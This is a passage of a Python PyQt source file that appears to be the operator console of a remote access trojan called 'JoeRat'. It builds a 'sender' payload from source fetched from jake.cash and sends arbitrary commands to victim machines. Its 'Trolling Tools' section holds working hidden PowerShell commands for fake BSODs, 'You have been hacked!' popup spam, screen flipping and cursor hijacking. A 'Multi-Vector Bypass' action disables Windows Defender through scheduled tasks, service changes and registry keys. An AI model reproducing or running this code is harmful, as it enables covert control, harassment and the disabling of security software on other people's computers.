        credits_layout = QVBoxLayout(credits_widget)
        credits_layout.setSpacing(16)
        credits_layout.setContentsMargins(0, 0, 0, 0)
        
        credits_title = QLabel('Credits')
        credits_title.setStyleSheet('''
            color: #818cf8; 
            font-size: 16px; 
            font-weight: 600; 
            margin-bottom: 12px;
        ''')
        credits_layout.addWidget(credits_title)
        
        credits_text = QLabel(
            'Developers: jake\n'
            'Designers: brad\n\n'
            '© 2026 All Rights Reserved • Version 1.0.1 BETA'
        )
        credits_text.setStyleSheet('''
            color: #9a9cb0; 
            font-size: 11px; 
            line-height: 1.8;
        ''')
        credits_text.setWordWrap(True)
        credits_text.setAlignment(Qt.AlignCenter)
        credits_layout.addWidget(credits_text)
        credits_layout.addStretch()
        
        about_layout.addWidget(credits_widget)
        about_layout.addStretch()
        
        # Slot machine symbols
        self.slot_symbols = ['🍒', '🍋', '🔔', '💎', '7️⃣', '⭐', '🍀', '💰']
        self.is_spinning = False
        
        about_joert.setLayout(about_layout)

        # Tabs
        self.tabs = QTabWidget()
        # Style the tabs for better visibility
        self.tabs.setStyleSheet('''
            QTabWidget::pane {
                border: 1px solid #2e3040;
                background: #12131a;
            }
            QTabBar::tab {
                background: #1a1b24;
                color: #e8e9f5;
                border: 1px solid #2e3040;
                border-bottom: none;
                padding: 8px 16px;
                margin-right: 2px;
                font-weight: bold;
                font-size: 11px;
            }
            QTabBar::tab:selected {
                background: #5865F2;
                color: #ffffff;
                border-color: #5865F2;
            }
            QTabBar::tab:hover:!selected {
                background: #2a2b3d;
                color: #bfdbfe;
                border-color: #3a3c4e;
            }
        ''')
        self.tabs.addTab(monitor_wall_widget, 'Clients')
        self.tabs.addTab(machine_detail_widget, 'Client Details')
        self.tabs.addTab(settings_widget, 'Settings')
        self.tabs.addTab(about_joert, 'About')

        # ── Top bar: MOTD on the left, logo on the right ──
        top_bar = QHBoxLayout()
        top_bar.setContentsMargins(8, 4, 8, 0)
        top_bar.setSpacing(8)

        self.motd_label = QLabel('')
        self.motd_label.setStyleSheet(
            'color: #9a9cb0; font-size: 10px; font-family: Consolas, monospace;'
            'background: transparent; border: none; padding: 4px 0;'
        )
        self.motd_label.setWordWrap(False)
        self.motd_label.setToolTip('Message of the Day — set from the server')
        self.motd_label.setVisible(False)
        top_bar.addWidget(self.motd_label, 1)
        top_bar.addStretch()

        logo_widget = QWidget()
        logo_widget.setFixedHeight(44)
        logo_widget.setStyleSheet(
            'QWidget { background: #1e1f2a; border: 1px solid #2e3040; border-radius: 8px; }'
        )
        logo_layout = QHBoxLayout(logo_widget)
        logo_layout.setContentsMargins(8, 4, 12, 4)
        logo_layout.setSpacing(8)
        logo_icon = QLabel()
        logo_icon.setStyleSheet('background: transparent; border: none;')
        _logo_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logo.png')
        _logo_loaded = False
        if os.path.exists(_logo_path):
            _logo_pm = QPixmap(_logo_path)
            if not _logo_pm.isNull():
                logo_icon.setPixmap(_logo_pm.scaled(34, 34, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                logo_icon.setFixedSize(34, 34)
                _logo_loaded = True
        if not _logo_loaded:
            logo_icon.setText('🖥')
            logo_icon.setStyleSheet(
                'font-size: 22px; background: transparent; border: none;'
            )
            logo_icon.setFixedSize(34, 34)
            logo_icon.setAlignment(Qt.AlignCenter)
        logo_layout.addWidget(logo_icon)
        logo_ver = QLabel(APP_VERSION)
        logo_ver.setStyleSheet(
            'font-size: 11px; color: #818cf8; background: transparent; border: none;'
            'font-family: Consolas, monospace; font-weight: bold;'
        )
        logo_ver.setToolTip(f'Version {APP_VERSION}')
        logo_layout.addWidget(logo_ver)
        top_bar.addWidget(logo_widget)

        # Wrap top bar + tabs in a container
        _central = QWidget()
        _central_layout = QVBoxLayout(_central)
        _central_layout.setContentsMargins(0, 0, 0, 0)
        _central_layout.setSpacing(0)
        _central_layout.addLayout(top_bar)
        _central_layout.addWidget(self.tabs, 1)

        # Central widget (stored for fullscreen restore)
        self.central_widget = _central
        self.setCentralWidget(_central)
        self.tabs.show()

        # Connect settings button
        self.ws_connect_btn.clicked.connect(self.change_ws_settings)
        self.ws_url_input.editingFinished.connect(self._save_viewer_config)
        self.room_id_input.editingFinished.connect(self._save_viewer_config)
        self.secret_input.editingFinished.connect(self._save_viewer_config)

        # Global stylesheet is set in main(); no need to duplicate here.

    def _switch_to_list_view(self):
        """Switch to compact list view."""
        self.current_view_mode = 'list'
        self._subscribe_all = True
        self.target_machine_id = ''
        asyncio.ensure_future(self.send_ws({'type': 'set-subscribe-all', 'enabled': True}))
        self._animate_view_transition(1)  # Index 1 is the list widget
        self._update_view_buttons()
        # Don't rebuild list - items already exist, just switch view

    def _update_view_buttons(self):
        """Update view toggle button styles based on current mode."""
        if self.current_view_mode == 'grid':
            self.grid_view_btn.setStyleSheet(
                'background: #5865F2; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-weight: bold;'
            )
            self.list_view_btn.setStyleSheet(
                'background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e; padding: 6px 12px; border-radius: 4px;'
            )
        elif self.current_view_mode == 'list':
            self.grid_view_btn.setStyleSheet(
                'background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e; padding: 6px 12px; border-radius: 4px;'
            )
            self.list_view_btn.setStyleSheet(
                'background: #5865F2; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-weight: bold;'
            )

    def _switch_to_grid_view(self):
        self.current_view_mode = 'grid'
        self._subscribe_all = True
        self.target_machine_id = ''
        asyncio.ensure_future(self.send_ws({'type': 'set-subscribe-all', 'enabled': True}))
        self._animate_view_transition(0)
        self._update_view_buttons()
        # Don't rebuild grid - thumbnails already exist, avoids flicker

    def _load_viewer_config(self):
        try:
            if os.path.exists(self._viewer_config_path):
                with open(self._viewer_config_path, 'r') as f:
                    cfg = json.load(f)
                self._server_presets = cfg.get('presets', [])
                last = cfg.get('last', {})
                if last.get('url'):
                    self.ws_url = last['url']
                if last.get('roomId'):
                    self.room_id = last['roomId']
                if last.get('secret') is not None:
                    self.secret = last['secret']
                if last.get('targetMachineId') is not None:
                    self.target_machine_id = last.get('targetMachineId', '')
        except Exception:
            pass

    def _save_viewer_config(self):
        try:
            url = self.ws_url_input.text().strip()
            room = self.room_id_input.text().strip()
            secret = self.secret_input.text().strip()
            target = self.target_machine_id_input.text().strip()
            if url:
                self.ws_url = url
            if room:
                self.room_id = room
            if secret:
                self.secret = secret
            self.target_machine_id = target
            cfg = {
                'presets': self._server_presets,
                'last': {
                    'url': self.ws_url,
                    'roomId': self.room_id,
                    'secret': self.secret,
                    'targetMachineId': self.target_machine_id
                }
            }
            with open(self._viewer_config_path, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception:
            pass

    def _refresh_preset_combo(self):
        self.preset_combo.blockSignals(True)
        self.preset_combo.clear()
        self.preset_combo.addItem('-- Select preset --', None)
        for p in self._server_presets:
            self.preset_combo.addItem(p.get('name', 'Unnamed'), p)
        self.preset_combo.blockSignals(False)

    def _on_preset_selected(self, index):
        if index <= 0:
            return
        p = self.preset_combo.itemData(index)
        if isinstance(p, dict):
            self.ws_url_input.setText(p.get('url', ''))
            self.room_id_input.setText(p.get('roomId', ''))
            self.secret_input.setText(p.get('secret', ''))

    def _load_preset(self):
        index = self.preset_combo.currentIndex()
        if index <= 0:
            return
        self._on_preset_selected(index)

    def _save_as_preset(self):
        name, ok = QInputDialog.getText(self, 'Save preset', 'Preset name:', text='My Server')
        if not ok or not name.strip():
            return
        preset = {
            'name': name.strip(),
            'url': self.ws_url_input.text().strip(),
            'roomId': self.room_id_input.text().strip(),
            'secret': self.secret_input.text().strip()
        }
        if not preset['url']:
            self.show_warning('Enter a server URL first.')
            return
        existing = next((i for i, p in enumerate(self._server_presets) if p.get('name') == preset['name']), None)
        if existing is not None:
            self._server_presets[existing] = preset
        else:
            self._server_presets.append(preset)
        self._refresh_preset_combo()
        self._save_viewer_config()
        self.show_warning(f'Preset "{preset["name"]}" saved.')

    def _delete_preset(self):
        index = self.preset_combo.currentIndex()
        if index <= 0:
            return
        p = self.preset_combo.itemData(index)
        if isinstance(p, dict):
            name = p.get('name', '')
            self._server_presets = [x for x in self._server_presets if x.get('name') != name]
            self._refresh_preset_combo()
            self._save_viewer_config()
            self.show_warning(f'Preset "{name}" deleted.')

    def _project_root(self):
        return os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    def _run_build(self, target):
        import tempfile, shutil, requests, zipfile, re
        # URL to download source ZIP (update as needed)
        SOURCE_URL = 'https://jake.cash/src/src.zip'  # TODO: update to your repo
        temp_dir = tempfile.mkdtemp(prefix='sender_build_')
        zip_path = os.path.join(temp_dir, 'src.zip')
        # Download ZIP
        try:
            r = requests.get(SOURCE_URL, stream=True)
            with open(zip_path, 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        except Exception as e:
            self.show_warning(f'Failed to download source: {e}')
            shutil.rmtree(temp_dir)
            return
        # Extract ZIP
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
        except Exception as e:
            self.show_warning(f'Failed to extract source: {e}')
            shutil.rmtree(temp_dir)
            return
        # Auto-fix Program.cs Main method signature and args usage
        program_cs_path = None
        for root, dirs, files in os.walk(temp_dir):
            for f in files:
                if f == 'Program.cs':
                    program_cs_path = os.path.join(root, f)
                    break
            if program_cs_path:
                break
        if program_cs_path:
            try:
                with open(program_cs_path, 'r', encoding='utf-8') as f:
                    code = f.read()
                # Replace Main definition
                code = re.sub(r'static void Main\s*\(\s*\)', 'static void Main(string[] args)', code)
                # Move all args references inside Main
                # This is a simple patch: if args is referenced outside Main, comment it out
                code = re.sub(r'(?m)^(?!.*Main).*args.*$', r'// \g<0>', code)
                with open(program_cs_path, 'w', encoding='utf-8') as f:
                    f.write(code)
            except Exception as e:
                self.show_warning(f'Failed to patch Program.cs: {e}')
        # URL to download source ZIP (update as needed)
        SOURCE_URL = 'https://jake.cash/src/src.zip'  # TODO: update to your repo
        temp_dir = tempfile.mkdtemp(prefix='sender_build_')
        zip_path = os.path.join(temp_dir, 'src.zip')
        # Download ZIP
        try:
            r = requests.get(SOURCE_URL, stream=True)
            with open(zip_path, 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        except Exception as e:
            self.show_warning(f'Failed to download source: {e}')
            shutil.rmtree(temp_dir)
            return
        # Extract ZIP
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
        except Exception as e:
            self.show_warning(f'Failed to extract source: {e}')
            shutil.rmtree(temp_dir)
            return
        # Find csproj
        if target == 'sender':
            csproj_path = None
            for root, dirs, files in os.walk(temp_dir):
                for f in files:
                    if f == 'JoeRat.csproj':
                        csproj_path = os.path.join(root, f)
                        break
                if csproj_path:
                    break
            title = 'Build Sender (dotnet publish)'
            output_path = os.path.join(temp_dir, 'publish')
            build_cmd = f'dotnet publish "{csproj_path}" --configuration Release --runtime win-x64 --output "{output_path}"'
        else:
            csproj_path = None
            for root, dirs, files in os.walk(temp_dir):
                for f in files:
                    if f == 'JoeRat.csproj':
                        csproj_path = os.path.join(root, f)
                        break
                if csproj_path:
                    break
            title = 'Build Server (dotnet publish)'
            output_path = os.path.join(temp_dir, 'publish')
            build_cmd = f'dotnet publish "{csproj_path}" --configuration Release --runtime win-x64 --output "{output_path}"'
        if not csproj_path:
            self.show_warning('Could not find .csproj in downloaded source.')
            shutil.rmtree(temp_dir)
            return
        # Collect variables from viewer input fields
        env_vars = os.environ.copy()
        env_vars['SENDER_SERVER_URL'] = self.ws_url_input.text().strip()
        env_vars['SENDER_ROOM_ID'] = self.room_id_input.text().strip()
        env_vars['SENDER_SECRET'] = self.secret_input.text().strip()
        # Run build command with environment variables
        process = QProcess(self)
        qenv = QProcessEnvironment()
        for k, v in env_vars.items():
            qenv.insert(k, v)
        process.setProcessEnvironment(qenv)
        process.setWorkingDirectory(temp_dir)
        process.setProgram('cmd')
        process.setArguments(['/c', build_cmd])
        dlg = BuildOutputDialog(self, title, temp_dir, build_cmd)
        dlg._process = process
        dlg.output.setPlainText(f'Running: {build_cmd}\n\n')
        process.readyReadStandardOutput.connect(dlg._on_stdout)
        process.readyReadStandardError.connect(dlg._on_stderr)
        process.finished.connect(dlg._on_finished)
        process.start()
        dlg.exec_()
        # Optionally clean up temp_dir after build
        # shutil.rmtree(temp_dir)

    def change_ws_settings(self):
        new_url = self.ws_url_input.text().strip()
        new_room = self.room_id_input.text().strip()
        new_secret = self.secret_input.text().strip()
        new_target = self.target_machine_id_input.text().strip()
        changed = False
        if new_url and new_url != self.ws_url:
            self.ws_url = new_url
            changed = True
        if new_room and new_room != self.room_id:
            self.room_id = new_room
            changed = True
        if new_secret and new_secret != self.secret:
            self.secret = new_secret
            changed = True
        if new_target != self.target_machine_id:
            self.target_machine_id = new_target
            changed = True
        self._save_viewer_config()
        if changed:
            self.status_label.setText('Reconnecting...')
            self.reconnect()

    _DEFAULT_SHORTCUTS = [
        ('\ud83d\udcca Task Mgr',   'start taskmgr'),
        ('\ud83e\uddee Calc',        'start calc'),
        ('\ud83d\udcdd Notepad',     'start notepad'),
        ('\ud83d\udcc1 Explorer',    'start explorer'),
        ('\u25a0 CMD',              'start cmd'),
        ('\ud83d\udc9c PowerShell',  'start powershell'),
    ]

    def _load_shortcuts(self) -> list:
        raw = self.settings.value('fun_shortcuts', None)
        if raw:
            try:
                loaded = json.loads(raw)
                if isinstance(loaded, list) and loaded:
                    return [(str(item[0]), str(item[1])) for item in loaded if len(item) == 2]
            except Exception:
                pass
        return list(self._DEFAULT_SHORTCUTS)

    def _save_shortcuts(self):
        self.settings.setValue('fun_shortcuts', json.dumps(self._shortcuts))

    def _rebuild_shortcut_grid(self):
        # Clear existing buttons
        while self._shortcut_grid_layout.count():
            item = self._shortcut_grid_layout.takeAt(0)
            if item and item.widget():
                item.widget().deleteLater()
        # Rebuild from self._shortcuts
        for idx, (label, cmd) in enumerate(self._shortcuts):
            btn = QPushButton(label)
            btn.setStyleSheet(
                'background: #1e1f2a; color: #9a9cb0; border: 1px solid #3a3c4e;'
                'border-radius: 4px; font-size: 8pt; padding: 4px;'
            )
            btn.setToolTip(f'Run: {cmd}\n(Right-click to remove)')
            btn.clicked.connect(lambda checked, c=cmd: self._launch_shortcut(c))
            btn.setContextMenuPolicy(Qt.CustomContextMenu)
            btn.customContextMenuRequested.connect(
                lambda pos, l=label, c=cmd: self._remove_shortcut(l, c)
            )
            self._shortcut_grid_layout.addWidget(btn, idx // 2, idx % 2)

    def _add_custom_shortcut(self):
        name, ok = QInputDialog.getText(self, 'Add Shortcut', 'Button label (e.g. "🔧 My Tool"):')
        if not ok or not name.strip():
            return
        cmd, ok2 = QInputDialog.getText(self, 'Add Shortcut', 'Command (e.g. "start myapp.exe"):')
        if not ok2 or not cmd.strip():
            return
        self._shortcuts.append((name.strip(), cmd.strip()))
        self._save_shortcuts()
        self._rebuild_shortcut_grid()

    def _remove_shortcut(self, label: str, cmd: str):
        menu = QMenu(self)
        action = menu.addAction(f'\u274c Remove "{label}"')
        chosen = menu.exec_(QCursor.pos())
        if chosen == action:
            self._shortcuts = [(l, c) for l, c in self._shortcuts if not (l == label and c == cmd)]
            self._save_shortcuts()
            self._rebuild_shortcut_grid()

    def _browse_local_exec(self):
        """Open a file dialog to paste a path into the remote command input."""
        path, _ = QFileDialog.getOpenFileName(
            self, 'Select File / Executable', '',
            'All Files (*)'
        )
        if path and hasattr(self, '_exec_path_input'):
            self._exec_path_input.setText(path)

    def _run_local_exec(self):
        """Send the typed command to the selected remote machine via WebSocket."""
        if not hasattr(self, '_exec_path_input'):
            return
        cmd = self._exec_path_input.text().strip()
        if not cmd:
            return
        if not self.selected_sender:
            if hasattr(self, '_exec_output'):
                self._exec_output.setPlainText('⚠ No remote machine selected.')
            return
        req_id = str(uuid.uuid4())
        self._fun_exec_request = req_id
        if hasattr(self, '_exec_output'):
            self._exec_output.setPlainText(f'$ {cmd}\n(running...')
        if hasattr(self, '_exec_run_btn'):
            self._exec_run_btn.setEnabled(False)
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.selected_sender,
            'command': cmd,
            'requestId': req_id,
        }))

    def _launch_shortcut(self, cmd):
        """Send a quick-launch command to the remote machine (no output tracking)."""
        if not self.selected_sender:
            if hasattr(self, '_exec_output'):
                self._exec_output.setPlainText('⚠ No remote machine selected.')
            return
        if hasattr(self, '_exec_output'):
            self._exec_output.setPlainText(f'⚡ Sent to remote: {cmd}')
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.selected_sender,
            'command': cmd,
            'requestId': '',
        }))

    # ── Remote Power Control ──

    _POWER_COMMANDS = {
        'lock':     'rundll32.exe user32.dll,LockWorkStation',
        'logoff':   'shutdown /l /f',
        'reboot':   'shutdown /r /t 0 /f',
        'shutdown': 'shutdown /s /t 0 /f',
    }

    _POWER_LABELS = {
        'lock':     '🔒 Lock Workstation',
        'logoff':   '🚪 Log Off User',
        'reboot':   '🔄 Reboot Machine',
        'shutdown': '⏻ Shut Down Machine',
    }

    def _send_power_action(self, action):
        """Send a power control command (lock/logoff/reboot/shutdown) with confirmation."""
        if not self.selected_sender:
            self.show_warning('Select a sender before using power controls.')
            return
        label = self._POWER_LABELS.get(action, action)
        cmd = self._POWER_COMMANDS.get(action)
        if not cmd:
            return
        # Require typed confirmation for destructive actions
        if action in ('reboot', 'shutdown', 'logoff'):
            reply = QInputDialog.getText(
                self, f'Confirm {label}',
                f'This will {action} "{self.selected_sender}".\n\nType "yes" to confirm:',
            )
            if not reply[1] or reply[0].strip().lower() != 'yes':
                self.show_warning(f'{label} cancelled.')
                return
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.selected_sender,
            'command': cmd,
            'requestId': '',
        }))
        self.show_warning(f'⚡ Sent: {label} → {self.selected_sender}')

    # ── Trolling Tools ──

    def _send_troll_action(self, action):
        """Send a trolling command to the selected remote machine."""
        if not self.selected_sender:
            self.show_warning('Select a sender before trolling.')
            return

        custom_text = ''
        if hasattr(self, '_troll_tts_input'):
            custom_text = self._troll_tts_input.text().strip()

        cmd = None
        label = action

        if action == 'tts':
            msg = custom_text or 'I am watching you'
            # Escape single quotes for PowerShell
            msg_safe = msg.replace("'", "''")
            cmd = (
                f'powershell -WindowStyle Hidden -Command "'
                f"Add-Type -AssemblyName System.Speech;"
                f" $s = New-Object System.Speech.Synthesis.SpeechSynthesizer;"
                f" $s.Speak('{msg_safe}')"
                f'"'
            )
            label = f'🗣️ TTS: "{msg}"'

        elif action == 'msgbox':
            msg = custom_text or 'Your computer has been selected for a random audit.'
            msg_safe = msg.replace("'", "''")
            cmd = (
                f'powershell -WindowStyle Hidden -Command "'
                f"Add-Type -AssemblyName PresentationFramework;"
                f" [System.Windows.MessageBox]::Show('{msg_safe}', 'System Notice', 'OK', 'Warning')"
                f'"'
            )
            label = f'💬 MsgBox: "{msg[:40]}"'

        elif action == 'rickroll':
            cmd = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
            label = '🎵 Rick Roll'

        elif action == 'beep':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                '[console]::beep(1000,300);[console]::beep(1500,300);[console]::beep(2000,300);'
                '[console]::beep(1000,300);[console]::beep(1500,300);[console]::beep(2000,500)"'
            )
            label = '🔔 Beep Melody'

        elif action == 'swap_mouse':
            cmd = 'rundll32 user32.dll,SwapMouseButton'
            label = '🖱️ Swap Mouse Buttons'

        elif action == 'fix_mouse':
            # Use registry to reset mouse button swap — more reliable than P/Invoke
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Set-ItemProperty -Path \'HKCU:\\Control Panel\\Mouse\' -Name SwapMouseButtons -Value 0;'
                ' rundll32.exe user32.dll,UpdatePerUserSystemParameters"'
            )
            label = '🖱️ Fix Mouse Buttons'

        elif action == 'calc_spam':
            cmd = 'cmd /c "for /L %i in (1,1,10) do start calc"'
            label = '🧮 Calculator x10'

        elif action == 'notepad_msg':
            msg = custom_text or 'I can see everything you do. 👁️'
            cmd = f'cmd /c "echo {msg}> %temp%\\msg.txt && notepad %temp%\\msg.txt"'
            label = '📝 Notepad Message'

        elif action == 'open_url':
            url = custom_text or ''
            if not url:
                url, ok = QInputDialog.getText(
                    self, 'Open URL',
                    'Enter URL to open on the remote machine:',
                    text='https://'
                )
                if not ok or not url.strip():
                    return
                url = url.strip()
            cmd = f'start {url}'
            label = f'🌐 Open URL: {url[:50]}'

        elif action == 'mute':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                '$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys([char]173)"'
            )
            label = '🔇 Toggle Mute'

        elif action == 'caps_disco':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                '$wsh = New-Object -ComObject WScript.Shell;'
                ' for($i=0; $i -lt 20; $i++) {'
                ' $wsh.SendKeys(\'{CAPSLOCK}\');'
                ' Start-Sleep -Milliseconds 150 }"'
            )
            label = '⌨️ Caps Lock Disco'

        elif action == 'wallpaper':
            url = custom_text or ''
            if not url:
                url, ok = QInputDialog.getText(
                    self, 'Set Wallpaper',
                    'Enter image URL for the remote wallpaper:',
                    text='https://'
                )
                if not ok or not url.strip():
                    return
                url = url.strip()
            # Download image from URL and set as wallpaper via PowerShell
            url_safe = url.replace("'", "''")
            cmd = (
                f"powershell -WindowStyle Hidden -Command \""
                f"$url = '{url_safe}';"
                f" $path = [System.IO.Path]::GetTempPath() + 'troll_wp.jpg';"
                f" (New-Object System.Net.WebClient).DownloadFile($url, $path);"
                f" Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices;"
                f" public class WP {{"
                f" [DllImport(\\\"user32.dll\\\", CharSet=CharSet.Auto)]"
                f" public static extern int SystemParametersInfo(int a, int b, string c, int d); }}';"
                f" [WP]::SystemParametersInfo(20, 0, $path, 3)\""
            )
            label = f'🖼️ Wallpaper → {url[:60]}'

        elif action == 'flip_screen':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices;'
                ' public class DispRotate {'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int EnumDisplaySettings(string d, int m, ref DEVMODE dm);'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int ChangeDisplaySettingsEx(string d, ref DEVMODE dm, IntPtr h, int f, IntPtr p);'
                ' [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]'
                ' public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;'
                ' public short dmSpecVersion; public short dmDriverVersion; public short dmSize;'
                ' public short dmDriverExtra; public int dmFields; public int dmPositionX; public int dmPositionY;'
                ' public int dmDisplayOrientation; public int dmDisplayFixedOutput; public short dmColor;'
                ' public short dmDuplex; public short dmYResolution; public short dmTTOption; public short dmCollate;'
                ' [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;'
                ' public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight;'
                ' public int dmDisplayFlags; public int dmDisplayFrequency; } }\';'
                ' $dm = New-Object DispRotate+DEVMODE; $dm.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($dm);'
                ' [DispRotate]::EnumDisplaySettings([NullString]::Value, -1, [ref]$dm);'
                ' $dm.dmDisplayOrientation = 2;'
                ' [DispRotate]::ChangeDisplaySettingsEx([NullString]::Value, [ref]$dm, [IntPtr]::Zero, 0, [IntPtr]::Zero)"'
            )
            label = '🔄 Flip Screen (180°)'

        elif action == 'max_volume':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                '$wsh = New-Object -ComObject WScript.Shell;'
                ' for($i=0; $i -lt 50; $i++) { $wsh.SendKeys([char]175) }"'
            )
            label = '🔊 Max Volume'

        elif action == 'fake_bsod':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -AssemblyName System.Windows.Forms;'
                ' $f = New-Object System.Windows.Forms.Form;'
                ' $f.BackColor = [System.Drawing.Color]::FromArgb(0,120,215);'
                ' $f.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None;'
                ' $f.WindowState = [System.Windows.Forms.FormWindowState]::Maximized;'
                ' $f.TopMost = $true;'
                ' $l = New-Object System.Windows.Forms.Label;'
                ' $l.ForeColor = [System.Drawing.Color]::White;'
                ' $l.Font = New-Object System.Drawing.Font(\\\"Segoe UI\\\", 28);'
                ' $l.AutoSize = $true;'
                ' $l.Location = New-Object System.Drawing.Point(100, 200);'
                ' $l.Text = \\\":( `nYour PC ran into a problem and needs to restart.`n`nStop code: CRITICAL_PROCESS_DIED`n`n0% complete\\\";'
                ' $f.Controls.Add($l);'
                ' $f.Add_KeyDown({ if($_.Key -eq \\\"Escape\\\") { $f.Close() } });'
                ' $t = New-Object System.Windows.Forms.Timer; $t.Interval = 30000;'
                ' $t.Add_Tick({ $f.Close() }); $t.Start();'
                ' $f.ShowDialog()"'
            )
            label = '💀 Fake BSOD (30s, ESC to close)'

        elif action == 'wmi_bypass':
            cmd = (
                'cmd /c "'
                'echo Method 1: Windows Update abuse... & '
                'wuauclt /UpdateNow /ShowUI & '
                'timeout /t 2 >nul & '
                'echo Method 2: Scheduled task abuse... & '
                'schtasks /create /tn "Windows Security" /tr "reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features /v TamperProtection /t REG_DWORD /d 0 /f" /sc once /st 00:00:00 /f & '
                'schtasks /run /tn "Windows Security" & '
                'timeout /t 3 >nul & '
                'echo Method 3: Service control abuse... & '
                'sc query WinDefend & '
                'sc config WinDefend start= disabled & '
                'echo Method 4: Registry via trusted process... & '
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f & '
                'schtasks /delete /tn "Windows Security" /f & '
                'echo Multi-vector bypass complete"'
            )
            label = '🎭 Multi-Vector Bypass'

        elif action == 'crazy_cursor':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices;'
                ' public class Cur { [DllImport(\\\"user32.dll\\\")] public static extern bool SetCursorPos(int x, int y); }\';'
                ' $r = New-Object System.Random;'
                ' $sw = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;'
                ' $sh = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height;'
                ' Add-Type -AssemblyName System.Windows.Forms;'
                ' for($i=0; $i -lt 100; $i++) {'
                ' [Cur]::SetCursorPos($r.Next($sw), $r.Next($sh));'
                ' Start-Sleep -Milliseconds 50 }"'
            )
            label = '🌀 Crazy Cursor (5s)'

        elif action == 'popup_loop':
            msg = custom_text or 'Warning: System compromised!'
            msg_safe = msg.replace("'", "''")
            cmd = (
                f'powershell -WindowStyle Hidden -Command "'
                f"Add-Type -AssemblyName PresentationFramework;"
                f" for($i=1; $i -le 5; $i++) {{"
                f" [System.Windows.MessageBox]::Show('{msg_safe} ('+$i+'/5)', 'Alert '+$i, 'OK', 'Error') }}"
                f'"'
            )
            label = f'💬 Popup Loop x5'

        elif action == 'spam_popups':
            msg = custom_text or 'You have been hacked!'
            msg_safe = msg.replace("'", "''")
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -AssemblyName System.Windows.Forms;'
                ' $rand = New-Object System.Random;'
                ' $sw = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;'
                ' $sh = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height;'
                ' for($i=0; $i -lt 20; $i++) {'
                ' $code = \'Add-Type -AssemblyName System.Windows.Forms;'
                ' $f = New-Object System.Windows.Forms.Form;'
                ' $f.StartPosition = \\\"Manual\\\";'
                ' $f.Location = New-Object System.Drawing.Point(\' + $rand.Next($sw - 300) + \', \' + $rand.Next($sh - 150) + \');'
                ' $f.Size = New-Object System.Drawing.Size(300, 150);'
                ' $f.Text = \\\"CRITICAL ALERT\\\";'
                ' $f.TopMost = $true;'
                ' $l = New-Object System.Windows.Forms.Label;'
                ' $l.Text = \\\"' + msg_safe + '\\\";'
                ' $l.AutoSize = $false;'
                ' $l.Dock = \\\"Fill\\\";'
                ' $l.TextAlign = \\\"MiddleCenter\\\";'
                ' $l.Font = New-Object System.Drawing.Font(\\\"Segoe UI\\\", 12, [System.Drawing.FontStyle]::Bold);'
                ' $l.ForeColor = [System.Drawing.Color]::Red;'
                ' $f.Controls.Add($l);'
                ' $f.ShowDialog()\';'
                ' Start-Job -ScriptBlock ([scriptblock]::Create($code)) | Out-Null;'
                ' Start-Sleep -Milliseconds 100 }"'
            )
            label = '💥 Spam Popups x20'

        elif action == 'screen_flash':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -AssemblyName System.Windows.Forms;'
                ' $f = New-Object System.Windows.Forms.Form;'
                ' $f.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None;'
                ' $f.WindowState = [System.Windows.Forms.FormWindowState]::Maximized;'
                ' $f.TopMost = $true; $f.Show();'
                ' for($i=0; $i -lt 20; $i++) {'
                ' if($i % 2 -eq 0) { $f.BackColor = [System.Drawing.Color]::White }'
                ' else { $f.BackColor = [System.Drawing.Color]::Black };'
                ' $f.Refresh(); Start-Sleep -Milliseconds 100 };'
                ' $f.Close()"'
            )
            label = '🔦 Screen Flash'

        elif action == 'flash_image':
            img_url = custom_text or ''
            if not img_url:
                img_url, ok = QInputDialog.getText(
                    self, 'Flash Image',
                    'Enter image URL to flash on the remote screen:',
                    text='https://'
                )
